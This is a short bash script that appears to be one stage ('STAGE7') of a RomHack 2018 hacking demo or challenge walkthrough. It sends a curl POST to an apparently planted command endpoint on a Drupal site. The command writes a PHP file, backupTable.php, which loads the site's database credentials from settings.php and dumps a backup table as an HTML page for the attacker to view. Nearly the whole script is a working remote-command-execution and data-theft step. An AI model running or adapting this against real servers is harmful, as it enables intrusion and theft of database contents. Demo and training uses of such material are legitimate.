#!/bin/bash
echo "~~ RomHack 2018 ~~"
echo 
echo "STAGE7"
echo "Show the content of backup DB"
echo "Write a PHP file backupTable.php on the remote server"
echo
echo "backupTable.php content:"
cat <<EOF
echo "<?php 
        require_once("settings.php");
        \$conn =  mysqli_connect(\$databases["default"]["default"]["host"], \$databases["default"]["default"]["username"], \$databases["default"]["default"]["password"]);
        \$query = mysqli_query(\$conn, \"select * from backup.backup\");
	echo "<table border=1>";
	echo "<tr>";
	echo "<th>idbackup</th>";
	echo "<th>timestamp</th>";
	echo "<th>script</th>";
	echo "<th>file</th>";
	echo "<th>md5</th>";
	echo "</tr>";
	while(\$row = mysqli_fetch_assoc(\$query)): 
		echo "<tr>";
		echo "<td>".\$row["idbackup"]."</td>";
		echo "<td>".\$row["timestamp"]."</td>";
		echo "<td>".\$row["script"]."</td>";
		echo "<td>".\$row["file"]."</td>";
		echo "<td>".\$row["md5"]."</td>";
		echo "</tr>";
	endwhile;
	echo "</table>"; 
?>" > backupTable.php
EOF
echo 
read pippo
echo "------"
curl -v 'http://www.org.lan/sites/default/drupal.settin.php' \
	--compressed \
	-H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0' \
	-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
	-H 'Accept-Language: en-GB,en;q=0.5' \
	-H 'Connection: keep-alive' \
	-H 'Content-Type: application/x-www-form-urlencoded' \
	-H 'Upgrade-Insecure-Requests: 1' \
	-H 'Pragma: no-cache' \
	-H 'Cache-Control: no-cache' \
	--data 'c=echo "<?php require_once(\"settings.php\");\$conn =  mysqli_connect(\$databases[\"default\"][\"default\"][\"host\"], \$databases[\"default\"][\"default\"][\"username\"], \$databases[\"default\"][\"default\"][\"password\"]);\$query = mysqli_query(\$conn, \"select * from backup.backup\");echo \"<table border=1>\";echo \"<tr>\";echo \"<th>idbackup</th>\";echo \"<th>timestamp</th>\";echo \"<th>script</th>\";echo \"<th>file</th>\";echo \"<th>md5</th>\";echo \"</tr>\";while(\$row = mysqli_fetch_assoc(\$query)): echo \"<tr>\";echo \"<td>\".\$row[\"idbackup\"].\"</td>\";echo \"<td>\".\$row[\"timestamp\"].\"</td>\";echo \"<td>\".\$row[\"script\"].\"</td>\";echo \"<td>\".\$row[\"file\"].\"</td>\";echo \"<td>\".\$row[\"md5\"].\"</td>\";echo \"</tr>\";endwhile;echo \"</table>\"; ?>" > backupTable.php'

echo
echo "Access: http://www.org.lan/sites/default/backupTable.php"
echo
